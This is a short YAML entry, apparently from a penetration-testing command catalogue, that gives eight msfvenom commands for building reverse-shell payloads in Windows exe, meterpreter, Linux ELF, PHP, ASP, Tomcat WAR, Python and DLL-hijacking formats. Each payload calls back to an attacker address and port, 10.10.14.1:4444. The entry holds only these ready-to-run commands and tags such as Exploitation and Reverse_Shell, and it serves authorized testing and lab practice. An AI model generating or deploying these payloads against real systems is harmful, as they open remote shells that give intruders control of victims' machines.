---
description: |
  Generate reverse shell payloads for various platforms and formats.

  Reference values:
    Attacker IP: 10.10.14.1
    Port: 4444
command: |
  # Windows exe
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe

  # Windows staged meterpreter
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o meterpreter.exe

  # Linux elf
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o shell.elf

  # PHP
  msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw > shell.php

  # ASP
  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f asp > shell.asp

  # WAR (Tomcat)
  msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war -o shell.war

  # Python
  msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.1 LPORT=4444 -f raw

  # DLL (for DLL hijacking)
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o hijack.dll
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services: []
items:
  - No_Creds
techniques:
  - Reverse_Shell
network_position:
  - External
  - Internal
references:
  - https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
---
